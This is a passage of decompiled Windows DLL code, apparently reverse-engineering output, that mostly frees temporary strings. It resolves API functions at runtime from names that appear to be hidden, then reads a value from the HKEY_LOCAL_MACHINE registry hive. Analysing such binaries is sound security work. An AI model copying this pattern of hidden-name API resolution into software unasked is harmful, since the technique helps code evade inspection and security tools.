    "      if ( (unsigned int)v86 >= 0x1000 )",
    "      {",
    "        v85 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "        v86 = (const CHAR *)(2 * v211 + 37);",
    "        if ( (unsigned int)((char *)lpModuleName[0] - (char *)v85 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v86;",
    "      sub_100154EB(v85);",
    "    }",
    "    v210 = 0;",
    "    v211 = 7;",
    "    LOWORD(lpModuleName[0]) = 0;",
    "    if ( v205 > 0xF )",
    "    {",
    "      v87 = v203[0];",
    "      v88 = (const CHAR *)(v205 + 1);",
    "      if ( v205 + 1 >= 0x1000 )",
    "      {",
    "        v87 = (void *)*((_DWORD *)v203[0] - 1);",
    "        v88 = (const CHAR *)(v205 + 36);",
    "        if ( (unsigned int)((char *)v203[0] - (char *)v87 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v88;",
    "      sub_100154EB(v87);",
    "    }",
    "    v204 = 0;",
    "    v205 = 15;",
    "    LOBYTE(v203[0]) = 0;",
    "    if ( v208 > 7 )",
    "    {",
    "      v89 = v206[0];",
    "      v90 = (const CHAR *)(2 * v208 + 2);",
    "      if ( (unsigned int)v90 >= 0x1000 )",
    "      {",
    "        v89 = (void *)*((_DWORD *)v206[0] - 1);",
    "        v90 = (const CHAR *)(2 * v208 + 37);",
    "        if ( (unsigned int)((char *)v206[0] - (char *)v89 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v90;",
    "      sub_100154EB(v89);",
    "    }",
    "    v207 = 0;",
    "    v208 = 7;",
    "    LOWORD(v206[0]) = 0;",
    "    if ( v202 > 0xF )",
    "    {",
    "      v18 = v200[0];",
    "      v19 = (const CHAR *)(v202 + 1);",
    "      if ( v202 + 1 >= 0x1000 )",
    "      {",
    "        v18 = (void *)*((_DWORD *)v200[0] - 1);",
    "        v19 = (const CHAR *)(v202 + 36);",
    "        if ( (unsigned int)((char *)v200[0] - (char *)v18 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      goto LABEL_35;",
    "    }",
    "    goto LABEL_36;",
    "  }",
    "  p_lpWideCharStr = &lpWideCharStr;",
    "  v167 = 1;",
    "  v24 = v206;",
    "  if ( v208 > 7 )",
    "    v24 = (void **)v206[0];",
    "  if ( v23(-2147483646, v24, 0, v167, p_lpWideCharStr) )",
    "  {",
    "    p_lpWideCharStr = 0;",
    "    *(_OWORD *)a1 = 0;",
    "    v167 = (int)&unk_1003B3A1;",
    "    *((_DWORD *)a1 + 4) = 0;",
    "    *((_DWORD *)a1 + 5) = 0;",
    "    sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "  }",
    "  else",
    "  {",
    "    memset(Src, 0, sizeof(Src));",
    "    v173 = &v163;",
    "    v218 = 512;",
    "    sub_10009E70(v178 + 312);",
    "    sub_1000B000(&v163, v99, v111, v123, v135, v147, v159);",
    "    LOBYTE(v221) = 14;",
    "    sub_10009E70(v178 + 1080);",
    "    LOBYTE(v221) = 13;",
    "    sub_1000B970((int)v182, v100, v112, v124, v136, v148, v160, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "    LOBYTE(v221) = 15;",
    "    sub_10009E70(v182);",
    "    sub_1000AA30((int)v188, (LPCCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "    LOBYTE(v221) = 16;",
    "    v176 = &v163;",
    "    sub_10009E70(v178 + 288);",
    "    sub_1000B000(&v163, v101, v113, v125, v137, v149, v161);",
    "    LOBYTE(v221) = 17;",
    "    sub_10009E70(v178 + 1056);",
    "    LOBYTE(v221) = 16;",
    "    sub_1000B970((int)v191, v102, v114, v126, v138, v150, v162, v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "    LOBYTE(v221) = 18;",
    "    v25 = v191;",
    "    if ( v193 > 0xF )",
    "      v25 = (void **)v191[0];",
    "    v26 = (int (__stdcall *)(LPCWCH, void **, _DWORD, void ***, int, LPCWCH *))((int (__stdcall *)(HMODULE, void **))ProcAddress)(",
    "                                                                                 LibraryA,",
    "                                                                                 v25);",
    "    if ( !v26 )",
    "    {",
    "      p_lpWideCharStr = 0;",
    "      *(_OWORD *)a1 = 0;",
    "      v167 = (int)&unk_1003B3A1;",
    "      *((_DWORD *)a1 + 4) = 0;",
    "      *((_DWORD *)a1 + 5) = 0;",
    "      sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "      if ( v193 > 0xF )",
    "      {",
    "        v57 = v191[0];",
    "        v58 = (const CHAR *)(v193 + 1);",
    "        if ( v193 + 1 >= 0x1000 )",
    "        {",
    "          v57 = (void *)*((_DWORD *)v191[0] - 1);",
    "          v58 = (const CHAR *)(v193 + 36);",
    "          if ( (unsigned int)((char *)v191[0] - (char *)v57 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v58;",
    "        sub_100154EB(v57);",
    "      }",
    "      v192 = 0;",
    "      v193 = 15;",
    "      LOBYTE(v191[0]) = 0;",
    "      if ( v190 > 7 )",
    "      {",
    "        v59 = v188[0];",
    "        v60 = (const CHAR *)(2 * v190 + 2);",
    "        if ( (unsigned int)v60 >= 0x1000 )",
    "        {",
    "          v59 = (void *)*((_DWORD *)v188[0] - 1);",
    "          v60 = (const CHAR *)(2 * v190 + 37);",
    "          if ( (unsigned int)((char *)v188[0] - (char *)v59 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v60;",
    "        sub_100154EB(v59);",
    "      }",
    "      v189 = 0;",
    "      v190 = 7;",
    "      LOWORD(v188[0]) = 0;",
    "      if ( v184 > 0xF )",
    "      {",
    "        v61 = v182[0];",
    "        v62 = (const CHAR *)(v184 + 1);",
    "        if ( v184 + 1 >= 0x1000 )",
    "        {",
    "          v61 = (void *)*((_DWORD *)v182[0] - 1);",
    "          v62 = (const CHAR *)(v184 + 36);",
    "          if ( (unsigned int)((char *)v182[0] - (char *)v61 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v62;",
    "        sub_100154EB(v61);",
    "      }",
    "      v183 = 0;",
    "      v184 = 15;",
    "      LOBYTE(v182[0]) = 0;",
    "      if ( v196 > 0xF )",
    "      {",
    "        v63 = v194[0];",
    "        v64 = (const CHAR *)(v196 + 1);",
    "        if ( v196 + 1 >= 0x1000 )",
    "        {",
    "          v63 = (void *)*((_DWORD *)v194[0] - 1);",
    "          v64 = (const CHAR *)(v196 + 36);",
    "          if ( (unsigned int)((char *)v194[0] - (char *)v63 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v64;",
    "        sub_100154EB(v63);",
    "      }",
    "      v195 = 0;",
    "      v196 = 15;",
    "      LOBYTE(v194[0]) = 0;",
    "      if ( v199 > 7 )",
    "      {",
    "        v65 = Block;",
    "        v66 = (const CHAR *)(2 * v199 + 2);",
    "        if ( (unsigned int)v66 >= 0x1000 )",
    "        {",
    "          v65 = (_BYTE *)*((_DWORD *)Block - 1);",
    "          v66 = (const CHAR *)(2 * v199 + 37);",
    "          if ( (unsigned int)((_BYTE *)Block - v65 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v66;",
    "        sub_100154EB(v65);",
    "      }",
    "      v198 = 0;",
    "      v199 = 7;",
    "      LOWORD(Block) = 0;",
    "      if ( v217 > 0xF )",
    "      {",
    "        v67 = (CHAR *)lpLibFileName[0];",
    "        v68 = (const CHAR *)(v217 + 1);",
    "        if ( v217 + 1 >= 0x1000 )",
    "        {",
    "          v67 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "          v68 = (const CHAR *)(v217 + 36);",
    "          if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v67 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v68;",
    "        sub_100154EB(v67);",
    "      }",
    "      v216 = 0;",
    "      v217 = 15;",
    "      LOBYTE(lpLibFileName[0]) = 0;",
    "      if ( v214 > 0xF )",
    "      {",
    "        v69 = (CHAR *)lpProcName[0];",
    "        v70 = (const CHAR *)(v214 + 1);",
    "        if ( v214 + 1 >= 0x1000 )",
    "        {",
    "          v69 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "          v70 = (const CHAR *)(v214 + 36);",
    "          if ( (unsigned int)(lpProcName[0] - (LPCSTR)v69 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v70;",
    "        sub_100154EB(v69);",
    "      }",
    "      v213 = 0;",
    "      v214 = 15;",
    "      LOBYTE(lpProcName[0]) = 0;",
    "      if ( v211 > 7 )",
    "      {",
    "        v71 = (WCHAR *)lpModuleName[0];",
    "        v72 = (const CHAR *)(2 * v211 + 2);",
    "        if ( (unsigned int)v72 >= 0x1000 )",
    "        {",
    "          v71 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "          v72 = (const CHAR *)(2 * v211 + 37);",
    "          if ( (unsigned int)((char *)lpModuleName[0] - (char *)v71 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v72;",
    "        sub_100154EB(v71);",
    "      }",
    "      v210 = 0;",
    "      v211 = 7;",
    "      LOWORD(lpModuleName[0]) = 0;",
    "      if ( v205 > 0xF )",
    "      {",
    "        v73 = v203[0];",
    "        v74 = (const CHAR *)(v205 + 1);",
    "        if ( v205 + 1 >= 0x1000 )",
    "        {",
    "          v73 = (void *)*((_DWORD *)v203[0] - 1);",
    "          v74 = (const CHAR *)(v205 + 36);",
    "          if ( (unsigned int)((char *)v203[0] - (char *)v73 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v74;",
    "        sub_100154EB(v73);",
    "      }",
    "      v204 = 0;",
    "      v205 = 15;",
    "      LOBYTE(v203[0]) = 0;",
    "      if ( v208 > 7 )",
    "      {",
    "        v75 = v206[0];",
    "        v76 = (const CHAR *)(2 * v208 + 2);",
    "        if ( (unsigned int)v76 >= 0x1000 )",
    "        {",
    "          v75 = (void *)*((_DWORD *)v206[0] - 1);",
    "          v76 = (const CHAR *)(2 * v208 + 37);",
    "          if ( (unsigned int)((char *)v206[0] - (char *)v75 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v76;",
    "        sub_100154EB(v75);",
    "      }",
    "      v207 = 0;",
    "      v208 = 7;",
    "      LOWORD(v206[0]) = 0;",
    "      if ( v202 > 0xF )",
    "      {",
    "        v18 = v200[0];",
    "        v19 = (const CHAR *)(v202 + 1);",
    "        if ( v202 + 1 >= 0x1000 )",
    "        {",
    "          v18 = (void *)*((_DWORD *)v200[0] - 1);",
    "          v19 = (const CHAR *)(v202 + 36);",
    "          if ( (unsigned int)((char *)v200[0] - (char *)v18 - 4) > 0x1F )",
    "            goto LABEL_190;",
    "        }",
    "        goto LABEL_35;",
    "      }",
    "LABEL_36:",
    "      v201 = 0;",
    "      v202 = 15;",
    "      LOBYTE(v200[0]) = 0;",
    "      if ( v187 > 7 )",
    "      {",
    "        v20 = v185[0];",
    "        v21 = (const CHAR *)(2 * v187 + 2);",
    "        if ( (unsigned int)v21 < 0x1000",
    "          || (v20 = (void *)*((_DWORD *)v185[0] - 1),",
    "              v21 = (const CHAR *)(2 * v187 + 37),",
    "              (unsigned int)((char *)v185[0] - (char *)v20 - 4) <= 0x1F) )",
    "        {",
    "LABEL_111:",
    "          p_lpWideCharStr = (LPCWCH *)v21;",
    "          sub_100154EB(v20);",
    "          return v1;",
    "        }",
    "LABEL_190:",
    "        _invalid_parameter_noinfo_noreturn();",
    "      }",
    "      return v1;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)&v218;",
    "    v167 = (int)Src;",
    "    v166 = &v219;",
    "    v27 = v188;",
    "    if ( v190 > 7 )",
    "      v27 = (void **)v188[0];",
    "    if ( v26(lpWideCharStr, v27, 0, v166, v167, p_lpWideCharStr) || v219 != (void **)1 )",
    "    {",
    "      *(_OWORD *)a1 = 0;",
    "      p_lpWideCharStr = 0;",
    "      *((_DWORD *)a1 + 4) = 0;",
    "      v167 = (int)&unk_1003B3A1;",
    "      *((_DWORD *)a1 + 5) = 0;",
    "      sub_100018C0(a1, (void *)v167, (size_t)p_lpWideCharStr);",
    "    }",
    "    else",
    "    {",
    "      v28 = wcslen(Src);",
    "      if ( v28 > v187 )",
    "      {",
    "        LOBYTE(cchWideChar) = 0;",
    "        sub_1000A3C0(v28, cchWideChar, Src);",
    "      }",
    "      else",
    "      {",
    "        v186 = v28;",
    "        p_lpWideCharStr = (LPCWCH *)(2 * v28);",
    "        v29 = v185;",
    "        if ( v187 > 7 )",
    "          v29 = (void **)v185[0];",
    "        memmove(v29, Src, (size_t)p_lpWideCharStr);",
    "        *((_WORD *)v29 + v28) = 0;",
    "        v1 = (WCHAR *)cchWideChar;",
    "      }",
    "      sub_10009D70(v185);",
    "      v30 = (_QWORD *)sub_1000AD50((int)&v171, (LPCWCH)v163, v164, v165, (int)v166, v167, (int)p_lpWideCharStr);",
    "      sub_100034A0(&v180, v30);",
    "      if ( v172 > 0xF )",
    "      {",
    "        v31 = v171;",
    "        v32 = (const CHAR *)(v172 + 1);",
    "        if ( v172 + 1 >= 0x1000 )",
    "        {",
    "          v31 = (_BYTE *)*((_DWORD *)v171 - 1);",
    "          v32 = (const CHAR *)(v172 + 36);",
    "          if ( (unsigned int)((_BYTE *)v171 - v31 - 4) > 0x1F )",
    "            _invalid_parameter_noinfo_noreturn();",
    "        }",
    "        p_lpWideCharStr = (LPCWCH *)v32;",
    "        sub_100154EB(v31);",
    "      }",
    "      *(_OWORD *)v1 = 0;",
    "      *((_DWORD *)v1 + 4) = 0;",
    "      v33 = v180;",
    "      *((_DWORD *)v1 + 5) = 0;",
    "      *(_OWORD *)v1 = v33;",
    "      *((_QWORD *)v1 + 2) = v181;",
    "    }",
    "    if ( v193 > 0xF )",
    "    {",
    "      v34 = v191[0];",
    "      v35 = (const CHAR *)(v193 + 1);",
    "      if ( v193 + 1 >= 0x1000 )",
    "      {",
    "        v34 = (void *)*((_DWORD *)v191[0] - 1);",
    "        v35 = (const CHAR *)(v193 + 36);",
    "        if ( (unsigned int)((char *)v191[0] - (char *)v34 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v35;",
    "      sub_100154EB(v34);",
    "    }",
    "    LOBYTE(v191[0]) = 0;",
    "    v193 = 15;",
    "    v192 = 0;",
    "    if ( v190 > 7 )",
    "    {",
    "      v36 = v188[0];",
    "      v37 = (const CHAR *)(2 * v190 + 2);",
    "      if ( (unsigned int)v37 >= 0x1000 )",
    "      {",
    "        v36 = (void *)*((_DWORD *)v188[0] - 1);",
    "        v37 = (const CHAR *)(2 * v190 + 37);",
    "        if ( (unsigned int)((char *)v188[0] - (char *)v36 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v37;",
    "      sub_100154EB(v36);",
    "    }",
    "    LOWORD(v188[0]) = 0;",
    "    v190 = 7;",
    "    v189 = 0;",
    "    if ( v184 > 0xF )",
    "    {",
    "      v38 = v182[0];",
    "      v39 = (const CHAR *)(v184 + 1);",
    "      if ( v184 + 1 >= 0x1000 )",
    "      {",
    "        v38 = (void *)*((_DWORD *)v182[0] - 1);",
    "        v39 = (const CHAR *)(v184 + 36);",
    "        if ( (unsigned int)((char *)v182[0] - (char *)v38 - 4) > 0x1F )",
    "          goto LABEL_190;",
    "      }",
    "      p_lpWideCharStr = (LPCWCH *)v39;",
    "      sub_100154EB(v38);",
    "    }",
    "    LOBYTE(v182[0]) = 0;",
    "    v184 = 15;",
    "    v183 = 0;",
    "  }",
    "  if ( v196 > 0xF )",
    "  {",
    "    v40 = v194[0];",
    "    v41 = (const CHAR *)(v196 + 1);",
    "    if ( v196 + 1 >= 0x1000 )",
    "    {",
    "      v40 = (void *)*((_DWORD *)v194[0] - 1);",
    "      v41 = (const CHAR *)(v196 + 36);",
    "      if ( (unsigned int)((char *)v194[0] - (char *)v40 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v41;",
    "    sub_100154EB(v40);",
    "  }",
    "  v195 = 0;",
    "  v196 = 15;",
    "  LOBYTE(v194[0]) = 0;",
    "  if ( v199 > 7 )",
    "  {",
    "    v42 = Block;",
    "    v43 = (const CHAR *)(2 * v199 + 2);",
    "    if ( (unsigned int)v43 >= 0x1000 )",
    "    {",
    "      v42 = (_BYTE *)*((_DWORD *)Block - 1);",
    "      v43 = (const CHAR *)(2 * v199 + 37);",
    "      if ( (unsigned int)((_BYTE *)Block - v42 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v43;",
    "    sub_100154EB(v42);",
    "  }",
    "  v198 = 0;",
    "  v199 = 7;",
    "  LOWORD(Block) = 0;",
    "  if ( v217 > 0xF )",
    "  {",
    "    v44 = (CHAR *)lpLibFileName[0];",
    "    v45 = (const CHAR *)(v217 + 1);",
    "    if ( v217 + 1 >= 0x1000 )",
    "    {",
    "      v44 = (CHAR *)*((_DWORD *)lpLibFileName[0] - 1);",
    "      v45 = (const CHAR *)(v217 + 36);",
    "      if ( (unsigned int)(lpLibFileName[0] - (LPCSTR)v44 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v45;",
    "    sub_100154EB(v44);",
    "  }",
    "  v216 = 0;",
    "  v217 = 15;",
    "  LOBYTE(lpLibFileName[0]) = 0;",
    "  if ( v214 > 0xF )",
    "  {",
    "    v46 = (CHAR *)lpProcName[0];",
    "    v47 = (const CHAR *)(v214 + 1);",
    "    if ( v214 + 1 >= 0x1000 )",
    "    {",
    "      v46 = (CHAR *)*((_DWORD *)lpProcName[0] - 1);",
    "      v47 = (const CHAR *)(v214 + 36);",
    "      if ( (unsigned int)(lpProcName[0] - (LPCSTR)v46 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v47;",
    "    sub_100154EB(v46);",
    "  }",
    "  v213 = 0;",
    "  v214 = 15;",
    "  LOBYTE(lpProcName[0]) = 0;",
    "  if ( v211 > 7 )",
    "  {",
    "    v48 = (WCHAR *)lpModuleName[0];",
    "    v49 = (const CHAR *)(2 * v211 + 2);",
    "    if ( (unsigned int)v49 >= 0x1000 )",
    "    {",
    "      v48 = (WCHAR *)*((_DWORD *)lpModuleName[0] - 1);",
    "      v49 = (const CHAR *)(2 * v211 + 37);",
    "      if ( (unsigned int)((char *)lpModuleName[0] - (char *)v48 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v49;",
    "    sub_100154EB(v48);",
    "  }",
    "  v210 = 0;",
    "  v211 = 7;",
    "  LOWORD(lpModuleName[0]) = 0;",
    "  if ( v205 > 0xF )",
    "  {",
    "    v50 = v203[0];",
    "    v51 = (const CHAR *)(v205 + 1);",
    "    if ( v205 + 1 >= 0x1000 )",
    "    {",
    "      v50 = (void *)*((_DWORD *)v203[0] - 1);",
    "      v51 = (const CHAR *)(v205 + 36);",
    "      if ( (unsigned int)((char *)v203[0] - (char *)v50 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v51;",
    "    sub_100154EB(v50);",
    "  }",
    "  v204 = 0;",
    "  v205 = 15;",
    "  LOBYTE(v203[0]) = 0;",
    "  if ( v208 > 7 )",
    "  {",
    "    v52 = v206[0];",
    "    v53 = (const CHAR *)(2 * v208 + 2);",
    "    if ( (unsigned int)v53 >= 0x1000 )",
    "    {",
    "      v52 = (void *)*((_DWORD *)v206[0] - 1);",
    "      v53 = (const CHAR *)(2 * v208 + 37);",
    "      if ( (unsigned int)((char *)v206[0] - (char *)v52 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v53;",
    "    sub_100154EB(v52);",
    "  }",
    "  v207 = 0;",
    "  v208 = 7;",
    "  LOWORD(v206[0]) = 0;",
    "  if ( v202 > 0xF )",
    "  {",
    "    v54 = v200[0];",
    "    v55 = (const CHAR *)(v202 + 1);",
    "    if ( v202 + 1 >= 0x1000 )",
    "    {",
    "      v54 = (void *)*((_DWORD *)v200[0] - 1);",
    "      v55 = (const CHAR *)(v202 + 36);",
    "      if ( (unsigned int)((char *)v200[0] - (char *)v54 - 4) > 0x1F )",
    "        goto LABEL_190;",
    "    }",
    "    p_lpWideCharStr = (LPCWCH *)v55;",
    "    sub_100154EB(v54);",
    "  }",
    "  v201 = 0;",
    "  v202 = 15;",
    "  LOBYTE(v200[0]) = 0;",
    "  if ( v187 > 7 )",
    "  {",
    "    v20 = v185[0];",
    "    v21 = (const CHAR *)(2 * v187 + 2);",
    "    if ( (unsigned int)v21 < 0x1000 )",
    "      goto LABEL_111;",
    "    v20 = (void *)*((_DWORD *)v185[0] - 1);",
    "    v21 = (const CHAR *)(2 * v187 + 37);",
    "    if ( (unsigned int)((char *)v185[0] - (char *)v20 - 4) <= 0x1F )",
    "      goto LABEL_111;",
    "    goto LABEL_190;",
    "  }",
    "  return v1;",
    "}",
    "",
    "",
    "WCHAR *__stdcall sub_10005470(WCHAR *a1)",
    "{",
    "  WCHAR *v1; // edi",
    "  const CHAR *v2; // ecx",
    "  const WCHAR *v3; // eax",
    "  HMODULE ModuleHandleW; // eax",
    "  const CHAR *v5; // eax",
    "  _BYTE *v6; // edx",
    "  const CHAR *v7; // ecx",
    "  CHAR *v8; // edx",
    "  const CHAR *v9; // ecx",
    "  CHAR *v10; // edx",
    "  const CHAR *v11; // ecx",
    "  WCHAR *v12; // edx",
    "  const CHAR *v13; // ecx",
    "  void *v14; // edx",
    "  const CHAR *v15; // ecx",
    "  void *v16; // edx",
    "  const CHAR *v17; // ecx",
    "  void *v18; // edx",
    "  const CHAR *v19; // ecx",
    "  void *v20; // edx",
    "  const CHAR *v21; // ecx",
    "  void **v22; // eax",
    "  int (__stdcall *v23)(int, void **, _DWORD, int, LPCWCH *); // ecx",
    "  void **v24; // eax",
    "  void **v25; // eax",
    "  int (__stdcall *v26)(LPCWCH, void **, _DWORD, void ***, int, LPCWCH *); // ecx",
    "  void **v27; // eax",
    "  unsigned int v28; // kr00_4",
    "  void **v29; // edi",
    "  _QWORD *v30; // eax",
    "  _BYTE *v31; // edx",
    "  const CHAR *v32; // ecx",
    "  __int128 v33; // xmm0",
    "  void *v34; // edx",
    "  const CHAR *v35; // ecx",
    "  void *v36; // edx",
    "  const CHAR *v37; // ecx",
    "  void *v38; // edx",
    "  const CHAR *v39; // ecx",
    "  void *v40; // edx",
    "  const CHAR *v41; // ecx",
    "  _BYTE *v42; // edx",
    "  const CHAR *v43; // ecx",
    "  CHAR *v44; // edx",
    "  const CHAR *v45; // ecx",
    "  CHAR *v46; // edx",
    "  const CHAR *v47; // ecx",
    "  WCHAR *v48; // edx",
    "  const CHAR *v49; // ecx",
    "  void *v50; // edx",
    "  const CHAR *v51; // ecx",
    "  void *v52; // edx",
    "  const CHAR *v53; // ecx",
    "  void *v54; // edx",
    "  const CHAR *v55; // ecx",
    "  void *v57; // edx",
    "  const CHAR *v58; // ecx",
    "  void *v59; // edx",
    "  const CHAR *v60; // ecx",
    "  void *v61; // edx",
    "  const CHAR *v62; // ecx",
    "  void *v63; // edx",
    "  const CHAR *v64; // ecx",
    "  _BYTE *v65; // edx",
    "  const CHAR *v66; // ecx",
    "  CHAR *v67; // edx",
    "  const CHAR *v68; // ecx",
    "  CHAR *v69; // edx",
    "  const CHAR *v70; // ecx",
    "  WCHAR *v71; // edx",
    "  const CHAR *v72; // ecx",
    "  void *v73; // edx",
    "  const CHAR *v74; // ecx",
    "  void *v75; // edx",
    "  const CHAR *v76; // ecx",
    "  void *v77; // edx",
    "  const CHAR *v78; // ecx",
    "  _BYTE *v79; // edx",
    "  const CHAR *v80; // ecx",
    "  CHAR *v81; // edx",
    "  const CHAR *v82; // ecx",
    "  CHAR *v83; // edx",
    "  const CHAR *v84; // ecx",
    "  WCHAR *v85; // edx",
    "  const CHAR *v86; // ecx",
    "  void *v87; // edx",
    "  const CHAR *v88; // ecx",
    "  void *v89; // edx",
    "  const CHAR *v90; // ecx",
    "  void *v91; // [esp-30h] [ebp-9C4h]",
    "  void *v92; // [esp-30h] [ebp-9C4h]",
    "  void *v93; // [esp-30h] [ebp-9C4h]",
    "  void *v94; // [esp-30h] [ebp-9C4h]",
    "  void *v95; // [esp-30h] [ebp-9C4h]",
    "  void *v96; // [esp-30h] [ebp-9C4h]",
    "  void *v97; // [esp-30h] [ebp-9C4h]",
    "  void *v98; // [esp-30h] [ebp-9C4h]",
    "  void *v99; // [esp-30h] [ebp-9C4h]",
    "  void *v100; // [esp-30h] [ebp-9C4h]",
    "  void *v101; // [esp-30h] [ebp-9C4h]",
    "  void *v102; // [esp-30h] [ebp-9C4h]",
    "  int v103; // [esp-2Ch] [ebp-9C0h]",
    "  int v104; // [esp-2Ch] [ebp-9C0h]",
    "  int v105; // [esp-2Ch] [ebp-9C0h]",
    "  int v106; // [esp-2Ch] [ebp-9C0h]",
    "  int v107; // [esp-2Ch] [ebp-9C0h]",
    "  int v108; // [esp-2Ch] [ebp-9C0h]",
    "  int v109; // [esp-2Ch] [ebp-9C0h]",
    "  int v110; // [esp-2Ch] [ebp-9C0h]",
    "  int v111; // [esp-2Ch] [ebp-9C0h]",
    "  int v112; // [esp-2Ch] [ebp-9C0h]",
    "  int v113; // [esp-2Ch] [ebp-9C0h]",
    "  int v114; // [esp-2Ch] [ebp-9C0h]",
    "  int v115; // [esp-28h] [ebp-9BCh]",
    "  int v116; // [esp-28h] [ebp-9BCh]",
    "  int v117; // [esp-28h] [ebp-9BCh]",
    "  int v118; // [esp-28h] [ebp-9BCh]",
    "  int v119; // [esp-28h] [ebp-9BCh]",
    "  int v120; // [esp-28h] [ebp-9BCh]",
    "  int v121; // [esp-28h] [ebp-9BCh]",
    "  int v122; // [esp-28h] [ebp-9BCh]",
    "  int v123; // [esp-28h] [ebp-9BCh]",
    "  int v124; // [esp-28h] [ebp-9BCh]",
    "  int v125; // [esp-28h] [ebp-9BCh]",
    "  int v126; // [esp-28h] [ebp-9BCh]",
    "  int v127; // [esp-24h] [ebp-9B8h]",
    "  int v128; // [esp-24h] [ebp-9B8h]",
    "  int v129; // [esp-24h] [ebp-9B8h]",
    "  int v130; // [esp-24h] [ebp-9B8h]",
    "  int v131; // [esp-24h] [ebp-9B8h]",
    "  int v132; // [esp-24h] [ebp-9B8h]",
    "  int v133; // [esp-24h] [ebp-9B8h]",
    "  int v134; // [esp-24h] [ebp-9B8h]",
    "  int v135; // [esp-24h] [ebp-9B8h]",
    "  int v136; // [esp-24h] [ebp-9B8h]",
    "  int v137; // [esp-24h] [ebp-9B8h]",
    "  int v138; // [esp-24h] [ebp-9B8h]",
    "  int v139; // [esp-20h] [ebp-9B4h]",
    "  int v140; // [esp-20h] [ebp-9B4h]",
    "  int v141; // [esp-20h] [ebp-9B4h]",
    "  int v142; // [esp-20h] [ebp-9B4h]",
    "  int v143; // [esp-20h] [ebp-9B4h]",
    "  int v144; // [esp-20h] [ebp-9B4h]",
    "  int v145; // [esp-20h] [ebp-9B4h]",
    "  int v146; // [esp-20h] [ebp-9B4h]",
    "  int v147; // [esp-20h] [ebp-9B4h]",
    "  int v148; // [esp-20h] [ebp-9B4h]",
    "  int v149; // [esp-20h] [ebp-9B4h]",
    "  int v150; // [esp-20h] [ebp-9B4h]",
    "  int v151; // [esp-1Ch] [ebp-9B0h]",
    "  int v152; // [esp-1Ch] [ebp-9B0h]",
    "  int v153; // [esp-1Ch] [ebp-9B0h]",
    "  int v154; // [esp-1Ch] [ebp-9B0h]",
    "  int v155; // [esp-1Ch] [ebp-9B0h]",
    "  int v156; // [esp-1Ch] [ebp-9B0h]",
    "  int v157; // [esp-1Ch] [ebp-9B0h]",
    "  int v158; // [esp-1Ch] [ebp-9B0h]",
    "  int v159; // [esp-1Ch] [ebp-9B0h]",
    "  int v160; // [esp-1Ch] [ebp-9B0h]",
    "  int v161; // [esp-1Ch] [ebp-9B0h]",
    "  int v162; // [esp-1Ch] [ebp-9B0h]",
    "  void *v163; // [esp-18h] [ebp-9ACh] BYREF",
    "  int v164; // [esp-14h] [ebp-9A8h]",
    "  int v165; // [esp-10h] [ebp-9A4h]",
    "  void ***v166; // [esp-Ch] [ebp-9A0h]",
    "  int v167; // [esp-8h] [ebp-99Ch]",
    "  LPCWCH *p_lpWideCharStr; // [esp-4h] [ebp-998h]",
    "  int v169; // [esp+0h] [ebp-994h]",
    "  int v170; // [esp+4h] [ebp-990h]",
    "  void *v171; // [esp+Ch] [ebp-988h] BYREF",
    "  unsigned int v172; // [esp+20h] [ebp-974h]",
    "  void **v173; // [esp+28h] [ebp-96Ch]",
    "  FARPROC ProcAddress; // [esp+2Ch] [ebp-968h]",
    "  HMODULE LibraryA; // [esp+30h] [ebp-964h]",
    "  void **v176; // [esp+34h] [ebp-960h]",
    "  int cchWideChar; // [esp+38h] [ebp-95Ch]",
    "  int v178; // [esp+3Ch] [ebp-958h]",
